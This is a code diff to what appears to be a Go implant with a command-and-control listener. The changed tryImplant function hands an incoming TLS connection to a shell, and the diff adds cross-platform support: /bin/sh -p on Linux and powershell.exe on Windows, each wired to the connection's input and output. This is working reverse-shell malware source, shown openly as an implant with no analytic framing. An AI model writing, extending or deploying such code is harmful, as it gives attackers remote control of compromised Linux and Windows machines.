@@ -18,6 +18,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"sync"
 	"time"
 )
@@ -123,14 +124,25 @@ func tryImplant(conf *tls.Config) {
 	defer c.Close()
 
 	/* Upgrade to a shell */
-	s := exec.Command("/bin/sh", "-p")
-	s.Stdin = c
-	s.Stdout = c
-	s.Stderr = c
-	if err := s.Run(); nil != err {
-		debugf("Shell: %s", err)
-	}
+	switch os := runtime.GOOS; os {
+	case "linux":
+		s := exec.Command("/bin/sh", "-p")
+		s.Stdin = c
+		s.Stdout = c
+		s.Stderr = c
+		if err := s.Run(); nil != err {
+			debugf("Shell: %s", err)
+		}
 
+	case "windows":
+		s := exec.Command("powershell.exe")
+		s.Stdin = c
+		s.Stdout = c
+		s.Stderr = c
+		if err := s.Run(); nil != err {
+			debugf("Windows :( %s", err)
+		}
+	}
 }
 
 /* doC2 listens for the implant */
